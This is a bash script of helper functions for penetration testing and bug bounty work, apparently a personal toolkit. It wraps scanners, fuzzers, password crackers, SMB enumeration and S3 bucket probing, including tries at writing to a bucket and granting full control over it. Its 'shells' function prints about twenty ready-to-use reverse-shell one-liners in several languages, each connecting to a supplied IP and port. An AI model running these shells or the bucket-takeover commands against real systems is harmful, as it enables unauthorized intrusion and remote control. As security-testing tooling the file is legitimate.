#!/bin/bash
# shellcheck disable=SC1087,SC2181,SC2162,SC2013

HACKING_HOME="/Users/bl4de/hacking"

GRAY='\033[38;5;8m'
RED='\033[1;31m'
GREEN='\033[1;32m'
LIGHTGREEN='\033[32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
BLUE_BG='\033[48;5;4m'
MAGENTA='\033[1;35m'
CYAN='\033[36m'

CLR='\033[0m'
NEWLINE='\n'

# runs $2 port(s) against IP; then -sV -sC -A against every open port found
full_nmap_scan() {
    if [[ -z "$2" ]]; then 
        echo -e "$BLUE[s0mbra] Running full nmap scan against all ports on $1 ...$CLR"
        ports=$(nmap -p- --min-rate=1000 -T4 $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
        nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
    else
        echo -e "$BLUE[s0mbra] Running full nmap scan against $2 port(s) on $1 ...$CLR"
        echo -e "   ...search open ports...$CLR"
        ports=$(nmap --top-ports "$2" --min-rate=1000 -T4 $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
        nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
    fi

    echo -e "$BLUE\n[s0mbra] Done! $CLR"
    osascript -e 'display notification "Full nmap finished, choom!" with title "s0mbra says:"'
}

# runs --top-ports $2 against IP
quick_nmap_scan() {
    if [[ -z "$2" ]]; then 
        echo -e "$BLUE[s0mbra] Running nmap scan against all ports on $1 ...$CYAN"
        nmap -p- --min-rate=1000 -T4 $1 
    else
        echo -e "$BLUE[s0mbra] Running nmap scan against top $2 ports on $1 ...$CYAN"
        nmap --top-ports $2 --min-rate=1000 -T4 $1
    fi
    
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
    osascript -e 'display notification "Quick nmap finished, choom!" with title "s0mbra says:"'
}

# runs Python 3 built-in HTTP server on [PORT]
http_server() {
    STACK=$2
    echo -e "$BLUE[s0mbra] Running $STACK HTTP Server in current directory on port $1$CLR"
    echo -e "$GRAY\navailable network interfaces:$YELLOW"
    ifconfig | grep -e 'inet\s' |cut -d' ' -f 2
    echo -e "$GRAY\navailable files/folders in SERVER ROOT: $CLR"
    ls -l
    echo -e "\n\n"
    if [[ -z "$1" ]]; then 
        PORT=7777; 
    else
        PORT=$1    
    fi

    case "$STACK" in
        python)
            python3 -m http.server $PORT
        ;;
        php)
            php -S 127.0.0.1:$PORT
        ;;
    esac
    echo -e "\n$BLUE[s0mbra] Done."
}

# runs john with rockyou.txt against hash type [FORMAT] and file [HASHES]
rockyou_john() {
    echo -e "$BLUE[s0mbra] Running john with rockyou dictionary against $1 of type $2$CLR"
    echo > "$HACKING_HOME"/tools/JohnTheRipper/run/john.pot
    if [[ -n $2 ]]; then
        "$HACKING_HOME"/tools/JohnTheRipper/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt --format="$2" "$1" 
        elif [[ -z $2 ]]; then
        "$HACKING_HOME"/tools/JohnTheRipper/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1"
    fi
    cat "$HACKING_HOME"/tools/JohnTheRipper/run/john.pot
    echo -e "\n$BLUE[s0mbra] Done."
    osascript -e 'display notification "our choom John has left the house..." with title "s0mbra says:"'
}

# show JohnTheRipper's pot file
john_pot() {
    echo -e "$BLUE[s0mbra] Joghn The Ripper pot file:$GRAY"
    cat "$HACKING_HOME"/tools/JohnTheRipper/run/john.pot
    echo -e "\n$BLUE[s0mbra] Done."
}

# ZIP password cracking with rockyou.txt
rockyou_zip() {
    echo -e "$BLUE[s0mbra] Running $MAGENTA zip2john $BLUE and prepare hash for hashcat..."
    "$HACKING_HOME"/tools/JohnTheRipper/run/zip2john "$1" | cut -d ':' -f 2 > ./hashes.txt
    echo -e "$BLUE[s0mbra] Starting $MAGENTA hashcat $BLUE (using $YELLOW rockyou.txt $BLUE dictionary against $YELLOW hashes.txt $BLUE file)...$CLR"
    hashcat -m 13600 ./hashes.txt ~/hacking/dictionaries/rockyou.txt
    echo -e "\n$BLUE[s0mbra] Done."
}

# converts id_rsa to JohnTheRipper format for cracking SSH key
ssh_to_john() {
    echo -e "$BLUE[s0mbra] Converting SSH id_rsa key to JohnTheRipper format to crack it$CLR"
    python "$HACKING_HOME"/tools/JohnTheRipper/run/sshng2john.py "$1" > "$1".hash
    echo -e "$BLUE[s0mbra] We have a hash.\n"
    echo -e "$BLUE[s0mbra] Let's now crack it!"
    rockyou_john "$1".hash
    echo -e "\n$BLUE[s0mbra] Done."
}

# runs unminify on $1 JavaScript file
unmin() {
    FILENAME=$1
    echo -e "$BLUE[s0mbra] Unminify $FILENAME...$CLR"
    unminify $FILENAME > unmimified.$FILENAME
    echo -e "\n$BLUE[s0mbra] Done."
}

# static code analysis of npm module installed in ~/node_modules
# with nodestructor and semgrep
snyktest() {
    echo -e "$BLUE[s0mbra] Auditing Node application using:\n -> npm audit\n -> snyk\n$CLR"
    echo -e "$BLUE[s0mbra] Running npm audit$CLR"
    npm audit .
    echo -e "$BLUE[s0mbra] Running snyk test$CLR"
    snyk test
    echo -e "$BLUE[s0mbra] Done."
}

# enumerates SMB shares on [IP] - port 445 has to be open
smb_enum() {
    if [[ -z $2 ]]; then
        username='NULL'
    elif [[ -n $2 ]]; then
        username="$2"
    fi

    if [[ -z $3 ]]; then
        password=''
    elif [[ -n $3 ]]; then
        password="$3"
    fi

    echo -e "$BLUE[s0mbra] Enumerating SMB shares with nmap on $1...$CLR"
    nmap -Pn -p445 --script=smb-enum-shares.nse,smb-enum-users.nse "$1"
    echo -e "$YELLOW\n[s0mbra] smbmap -u $username -p $password against\t\t -> $1...$CLR"
    smbmap -H "$1" -u "$username" -p "$password" 2>&1 | tee __disks
    for d in $(grep 'READ' __disks | cut -d' ' -f 1); do
        echo -e "$YELLOW\n[s0mbra] content of $d directory saved to $1__shares_listings $CLR"
        smbmap -H "$IP" -u "$username" -p "$password" -R "$d" >> "$1"__shares_listings
    done
    rm -f __disks
    echo -e "\n$BLUE[s0mbra] Done."
}

# download file from SMB share
smb_get_file() {
    if [[ -z $3 ]]; then
        username='NULL'
    elif [[ -n $3 ]]; then
        username="$3"
    fi

    if [[ -z $4 ]]; then
        password=''
    elif [[ -n $4 ]]; then
        password="$4"
    fi

    echo -e "$BLUE[s0mbra] Downloading file $2 from $1...$CLR"
    echo -e "$GREEN"
    smbmap -H "$1" -u "$3" -p "$4" --download "$2"
    echo -e "$CLR"
    echo -e "\n$BLUE[s0mbra] Done."
}

# mounts SMB share at ./mnt/shares
smb_mount() {
    echo -e "$BLUE[s0mbra] Mounting SMB $2 share from $1 at ./mnt/shares...$CLR"
    mkdir -p mnt/shares
    echo "//$3@$1/$2"
    mount_smbfs "//$3@$1/$2" ./mnt/shares
    echo -e "$YELLOW\n[s0mbra] Locally available shares:\n.$CLR"
    ls -l ./mnt/shares
    echo -e "\n$BLUE[s0mbra] Done."
}

# umounts from ./mnt/shares and delete it
smb_umount() {
    echo -e "$BLUE[s0mbra] Unmounting SMB share(s) from ./mnt/shares...$CLR"
    umount ./mnt/shares
    rm -rf ./mnt
    echo -e "\n$BLUE[s0mbra] Done."
}

# if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
# we can enumerate nfs shares available:
nfs_enum() {
    echo -e "$BLUE[s0mbra] Enumerating nfs shares (TCP 2049) on $1...$CLR"
    nmap -Pn -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount "$1"
    echo -e "\n$BLUE[s0mbra] Done."
}

# quick scope, but for single domain - no need to create scope file
enum() {
    TMPDIR=$(pwd)/$1
    if [[ ! -d $TMPDIR ]]; then
        mkdir -p $TMPDIR
    fi
    START_TIME=$(date)
    DOMAIN=$1
    echo -e "$BLUE[s0mbra] Let's see what have we got here...$CLR\n"

    # sublister
    echo -e "\n$GREEN--> sublister$CLR\n"
    sublister -v -d $DOMAIN -o "$TMPDIR/sublister_$DOMAIN.log"
    
    # subfinder
    echo -e "\n$GREEN--> subfinder$CLR\n"
    subfinder -nW -all -v -d $DOMAIN -o $TMPDIR/subfinder.log

    # prepare list of uniqe subdomains
    cat $TMPDIR/sub* > $TMPDIR/step1
    sed 's/<BR>/#/g' $TMPDIR/step1 | tr '#' '\n' > $TMPDIR/step2
    sort -u -k 1 $TMPDIR/step2 > $TMPDIR/subdomains_final.log
    rm -f $TMPDIR/step*

    # cleanup
    echo -e "\n$BLUE[s0mbra] Remove temporary files...\n"
    rm -f $TMPDIR/sublister_$DOMAIN.log
    rm -f $TMPDIR/subfinder.log

    END_TIME=$(date)
    echo -e "$GREEN\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    echo -e "$GRAY sublister+subfinder found \t $YELLOW $(echo `wc -l $TMPDIR/subdomains_final.log` | cut -d" " -f 1) $GRAY subdomains"
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
    osascript -e 'display notification "Hey choom, enum finished!" with title "s0mbra says:"'
}


# httpx only list
webservers() {
    if [[ -z $1 ]]; then
        SUBDOMAINS="subdomains_final.log"
    elif [[ -n $1 ]]; then
        SUBDOMAINS="$1"
    fi
    START_TIME=$(date)
    # httpx
    echo -e "\n$GREEN--> httpx$CLR\n"
    httpx -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -fcdn cloudfront -v -stats -status-code -web-server -tech-detect -mc 200,301,302,304,403,500 -ip -cname -cdn -l $(pwd)/$SUBDOMAINS -o $(pwd)/httpx.log

    END_TIME=$(date)
    echo -e "$GREEN\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    echo -e "$GRAY httpx found \t\t\t $YELLOW $(echo `wc -l $(pwd)/httpx.log` | cut -d" " -f 1) $GRAY 200 OKs web servers $GREEN"
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
    osascript -e 'display notification "Hey choom, we have some webservers to hack!" with title "s0mbra says:"'
}

# does recon on URL: nmap, ffuf, other smaller tools, ...?
# pass ONLY hostname (without protocol prefix)
recon() {
    HOSTNAME=$1

    # set proto:
    if [[ -z $2 ]]; then
        # default options:
        NMAP="1"
        NIKTO="1"
        FFUF="1"
        SUBDOMANIZER="1"
        SELECTED_OPTIONS="nmap, nikto, ffuf, subdomanizer"
    else
        # set options:
        NMAP=$(echo $2|grep 'nmap'|wc -l)
        NIKTO=$(echo $2|grep 'nikto'|wc -l)
        VHOSTS=$(echo $2|grep 'vhosts'|wc -l)
        FFUF=$(echo $2|grep 'ffuf'|wc -l)
        SUBDOMANIZER=$(echo $2|grep 'subdomanizer'|wc -l)
        SELECTED_OPTIONS=$2
    fi

    # set proto:
    if [[ -z $3 ]]; then
        PROTO='https'
    else
        PROTO=$3
    fi

    # setup output directory
    rm -rf $(pwd)/s0mbra
    mkdir -vp $(pwd)/s0mbra
    TMPDIR=$(pwd)/s0mbra

    START_TIME=$(date)
    echo -e "$BLUE[s0mbra] Running bruteforced, dirty, noisy as hell recon on $PROTO://$HOSTNAME \n\t using selected options: $SELECTED_OPTIONS...$CLR"

    # onaws
    echo -e "\n$GREEN--> onaws? $CLR\n"
    onaws $HOSTNAME

    # nmap
    if [[ $NMAP -eq "1" ]]; then
        echo -e "\n$GREEN--> nmap (top 100 ports + version discovery + nse scripts)$CLR\n"
        nmap --top-ports 100 -n --disable-arp-ping -sV -A -oN $TMPDIR/s0mbra_nmap_$HOSTNAME.log $HOSTNAME
    fi

    # nikto
    if [[ $NIKTO -eq "1" ]]; then
        echo -e "\n$GREEN--> nikto (max. 10 minutes) $CLR\n"
        nikto -host $PROTO://$HOSTNAME -404code 404,301,302,304 -maxtime 10m -o $TMPDIR/s0mbra_nikto_$HOSTNAME.log -Format txt -useragent "bl4de/HackerOne"
    fi

    if [[ $VHOSTS -eq "1" ]]; then
        # vhosts enumeration
        ffuf -ac -c -w $DICT_HOME/vhosts -u $PROTO://FUZZ.$HOSTNAME -mc=200,206,301,302,422,429 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -H "Host: FUZZ.$HOSTNAME" -o $TMPDIR/ffuf_vhosts_fullnames_$HOSTNAME.log
    fi

    # ffuf
    if [[ $FFUF -eq "1" ]]; then
        ffuf -ac -c -w $DICT_HOME/starter.txt -u $PROTO://$HOSTNAME/FUZZ -mc=200,206,301,302,422,429 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/ffuf_starter_$HOSTNAME.log
        ffuf -ac -c -w $DICT_HOME/lowercase.txt -u $PROTO://$HOSTNAME/FUZZ/ -mc=200,206,301,302,422,429 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/ffuf_lowercase_$HOSTNAME.log
    fi

    # subdomanizer
    if [[ $SUBDOMANIZER -eq "1" ]]; then
        echo -e "\n$GREEN--> SubDomanizer$CLR\n"
        subdomanizer --url $PROTO://$HOSTNAME/
    fi

    END_TIME=$(date)
    echo -e "\n$GREEN[s0mbra] Finished!"
    echo -e "\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

fu() {
    # use starter.txt as default dictionary
    if [[ -z $2 ]]; then
        SELECTED_DICT=starter
    else
        SELECTED_DICT=$2
    fi

    # set response status code(s) to match on:
    if [[ -z $4 ]]; then
        HTTP_RESP_CODES=200,206,301,302,401,500
    else
        HTTP_RESP_CODES=$4
    fi
    
    echo -e "$BLUE[s0mbra] Enumerate web resources on $1 with $SELECTED_DICT.txt dictionary matching $HTTP_RESP_CODES...$CLR"
    
    if [[ -n $3 ]]; then
        if [[ $3 == "/" ]]; then
            # if $3 arg passed to fu equals / - add at the end of the path (for dir enumerations where sometimes
            # dir path has to end with / to be identified
            ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$SELECTED_DICT.txt -u $1/FUZZ/ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
        else
            if [[ $3 == "-" ]]; then
                # if $3 equals - (dash) that means we should ignore it at all
                ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$SELECTED_DICT.txt -u $1/FUZZ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
            else
                # if $3 arg is not /, treat it as file extension to enumerate files:
                ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$SELECTED_DICT.txt -u $1/FUZZ.$3 -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
            fi
        fi
    else
        ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$SELECTED_DICT.txt -u $1/FUZZ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
    osascript -e 'display notification "ffuf finished, choom!" with title "s0mbra says:"'
}

api_fuzz() {
    clear
    echo -e "$BLUE[s0mbra] Fuzzing $1 API with httpie using endpoints file $2...$CLR"
    
    for endpoint in $(cat $2); do
        https --print=HBh --all --follow POST https://$1/$endpoint payload=data
        https --print=HBh --all --follow PUT https://$1/$endpoint payload=data
    done
 
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

kiterunner() {
    HOSTNAME=$1
    echo -e "$BLUE[s0mbra] Running kiterunner using apis file...$CLR\n"

    kr scan apis -w $DICT_HOME/routes-large.kite -x 20 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# Python Static Source Code analysis
pysast() {
    DIR_NAME=$1
    echo -e "$BLUE[s0mbra] Running pyflakes against $DIR_NAME $CLR\n"
    python3 -m pyflakes $DIR_NAME

    echo -e "$BLUE[s0mbra] Running mypy against $DIR_NAME $CLR\n"
    python3 -m mypy $DIR_NAME

    echo -e "\n$BLUE[s0mbra] Running bandit against $DIR_NAME $CLR\n"
    python3 -m bandit -r $DIR_NAME

    echo -e "\n$BLUE[s0mbra] Running vulture against $DIR_NAME $CLR\n"
    python3 -m vulture $DIR_NAME

    # cleanup
    rm -rf .mypy_cache
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# checking AWS S3 bucket
s3() {
    echo -e "$BLUE[s0mbra] Checking AWS S3 $1 bucket$CLR"
    aws s3 ls "s3://$1" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ content of the bucket can be listed!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- could not list the content... :/$CLR"
    fi

    touch test.txt
    echo 'TEST' >> test.txt
    aws s3 cp test.txt "s3://$1/test.txt" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ WOW!!! We can copy files to the bucket!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, cp does not work... :/$CLR"
    fi
    rm -f test.txt

    declare -a s3api=(
        "get-bucket-acl" 
        "put-bucket-acl" 
        "get-bucket-website" 
        "get-bucket-cors"
        "get-bucket-lifecycle-configuration" 
        "get-bucket-policy" 
        "list-bucket-metrics-configurations"
        "list-multipart-uploads" 
        "list-object-versions" 
        "list-objects"
    )
    for cmd in "${s3api[@]}"; do
        echo -e "---------------------------------------------------------------------------------"
        aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        if [[ "$?" == 0 ]]; then
            echo -e "\n\n$GREEN+  $cmd works!$CLR\n"
            aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        elif [[ "$?" != 0 ]]; then
            echo -e "\n$RED- nope, $cmd does not seem to be working... :/$CLR"
        fi
    done

    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=bl4de@wearehackerone.com 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  We can grant full control!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, can't grant control with --grant-full-control ... :/$CLR"
    fi
    echo -e "\n$BLUE[s0mbra] Done."
}

# downloads file from S3 directory
s3get() {
    clear
    echo -e "$BLUE[s0mbra] Getting $2 from $1 bucket...$CLR"

    aws s3api get-object-acl --bucket "$1" --key "$2" 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ We can read ACL of $3$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't check $2 ACL... :/$CLR"
    fi

    aws s3api get-object --bucket "$1" --key "$2" "$1".downloaded 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  $2 downloaded in current directory as $2.downloaded$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't get $2 :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# uploads file to S3 directory
s3gput() {
    clear
    echo -e "$BLUE[s0mbra] Uploading $2 to $1...$CLR"

    # aws s3api get-object-acl --bucket "$1" --key "$2" 2> /dev/null
    # if [[ "$?" == 0 ]]; then
    #     echo -e "\n$GREEN+ We can read ACL of $3$CLR"
    # elif [[ "$?" != 0 ]]; then
    #     echo -e "\n$RED- can't check $2 ACL... :/$CLR"
    # fi

    # aws s3api get-object --bucket "$1" --key "$2" "$1".downloaded 2> /dev/null
    # if [[ "$?" == 0 ]]; then
    #     echo -e "\n$GREEN+  $2 downloaded in current directory as $2.downloaded$CLR"
    # elif [[ "$?" != 0 ]]; then
    #     echo -e "\n$RED- can't get $2 :/$CLR"
    # fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# Lists content of the folder on S3 bucket
s3ls() {
    clear
    echo -e "$BLUE[s0mbra] Listing $2 folder on $1 bucket...$CLR"
    aws s3 ls "s3://$1/$2/" 2> /dev/null
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# Lists content of the folder on S3 bucket
discloS3() {
    clear
    echo -e "$BLUE[s0mbra] Execute bucket-disclose.sh against $1...$CLR"
    bucket-disclose $1 DEBUG
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# coverts .dex file to .jar archive
dex_to_jar() {
    clear
    echo -e "$BLUE[s0mbra] Exporting $1 into .jar...$CLR"
    d2j-dex2jar --force $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# unpack .jar archive
unjar() {
    clear
    echo -e "$BLUE[s0mbra] Opening $1 in JD-Gui...$CLR"
    /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx-gui $1
}

# runs disassembly agains binary
disass() {
    clear
    echo -e "$BLUE[s0mbra] Disassembling $1, saving to 1.asm..."
    objdump -d --arch-name=x86-64 -M intel $1 > 1.asm
    echo -e "\n$BLUE[s0mbra] Done."
}

# runs Java decompiler jadx
jadx() {
    clear
    echo -e "$BLUE[s0mbra] Opening $1 in JADX...$CLR"
    /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx-gui $1
}

# executes grpahw00f graphql-cop against GraphQL endpoint
gql() {
    clear
    echo -e "$BLUE[s0mbra] Fingerprinting GraphQl endpoints on $1...$CYAN"
    python3 /Users/bl4de/hacking/tools/graphw00f/main.py -d -f -t $1
    echo -e "$BLUE[s0mbra] Running GraphQL-Cop against $1...$CYAN"
    python3 /Users/bl4de/hacking/tools/graphql-cop/graphql-cop.py -t $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# executes graphw00f fingerprint against GraphQL endpoint
graphw00f() {
    clear
    echo -e "$BLUE[s0mbra] Fingerprinting $1 GraphQL endpoint with graphw00f...$CYAN"
    python3 /Users/bl4de/hacking/tools/graphw00f/main.py -d -f -t $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# runs Ruby SAST tools against Ruby application
ruby_sast() {
    clear
    echo -e "$BLUE[s0mbra] Running brakeman against $1...$CYAN"
    brakeman $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# does stuff with Android APK file
apk() {
    clear
    echo -e "$BLUE[s0mbra] OK, let's see this APK...$CLR"
    unzip -d unzipped $1
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ Unizpped, now run apktool on it...$CLR"
        apktool d $1
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- unzipping .apk failed :/... :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# xreate Android Studio project from Android apk file
apk_to_studio() {
    clear
    echo -e "$BLUE[s0mbra] Creating Android Studio project from APK file...$YELLOW"
    /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx --deobf -e -d out "$1"
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# extracts Androind .ab archive
abe() {
    clear
    echo -e "$BLUE[s0mbra] Extracting $1.ab backup into $1.tar...$CLR"
    java -jar /Users/bl4de/hacking/tools/Java_Decompilers/android-backup-extractor/build/libs/abe.jar unpack $1 $1.tar
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN[s0mbra] Success! $1.ab unpacked and $1.tar was created..."
        echo -e "[s0mbra] Let's untar some files, shall we?$CLR"
        rm -rf $1_extracted && mkdir ./$1_extracted
        tar -xf $1.tar -C $1_extracted
        echo -e "\n$GREEN[s0mbra] tar extracted, folder(s) created:$CLR"
        ls -l $1_extracted
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- Damn... :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# generates reverse shells in various languages for given IP:PORT
shells() {
    clear
    port=$2

    echo -e "$BLUE[s0mbra] OK, here are your shellz...\n$CLR"

    echo -e "$YELLOW[bash]\033[0m\t\tbash -i >& /dev/tcp/$1/$port 0>&1"
    echo -e "$YELLOW[bash]\033[0m\t\t0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
    echo -e "$YELLOW[bash]\033[0m\t\trm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
    echo -e "$YELLOW[bash]\033[0m\t\trm -f backpipe; mknod /tmp/backpipe p && nc $1 $port 0<backpipe | /bin/bash 1>backpipe"
    echo
    echo -e "\033[1;31m[gawk]\033[0m\t\tgawk 'BEGIN {P=$port;S=\"cmd> \";H=\"$1\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
    echo -e "\033[1;31m[awk]\033[0m\t\tawk 'BEGIN {s = \"/inet/tcp/0/$1/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
    echo
    echo -e "\033[1;34m[perl]\033[0m\t\tperl -e 'use Socket;\$i=\"$1\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo -e "\033[1;34m[perl]\033[0m\t\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo -e "\033[1;34m[perl]\033[0m\t\tperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo
    echo -e "\033[1;36m[python]\033[0m\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
    echo
    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);shell_exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);system(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);popen(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo
    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec('bash -i >& /dev/tcp/$1/$port 0>&1');\""
    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec('nc -e /bin/sh $1 $port')\""
    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/$1/$port 0>&1'\")\""
    echo
    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo
    echo -e "\033[36m[nc]\033[0m\t\tnc -e /bin/sh $1 $port"
    echo -e "\033[36m[nc]\033[0m\t\tnc -c /bin/sh $1 $port"
    echo -e "\033[36m[nc]\033[0m\t\t/bin/sh | nc $1 $port"
    echo -e "\033[36m[nc]\033[0m\t\trm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
    echo -e "\033[36m[nc]\033[0m\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
    echo
    echo -e "\033[1;35m[Java]\033[0m\t\tr = Runtime.getRuntime();p = r.exec([\"/bin/bash","-c","exec 5<>/dev/tcp/$1/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
    echo
    echo -e "\033[1;32m[Go]\033[0m\t\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$1:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go"
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# decodes Base64 string
b64() {
    echo -e "$BLUE[s0mbra] Decoding Base64 string...$CLR"
    echo $1 | base64 -D
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# hash/encode string
hshr() {
    echo -e "$BLUE[s0mbra] Hash/encoode $1...$CLR"
    hasher "$1"
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# extract links and API endpoints from JavaScript file
urls() {
    echo -e "$BLUE[s0mbra] Extracting URLs from $1...$CLR"
    python /Users/bl4de/hacking/tools/LinkFinder/linkfinder.py -i "$1" -o cli | rg http | sort -u
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

endpoints() {
    echo -e "$BLUE[s0mbra] Extracting URLs from $1...$CLR"
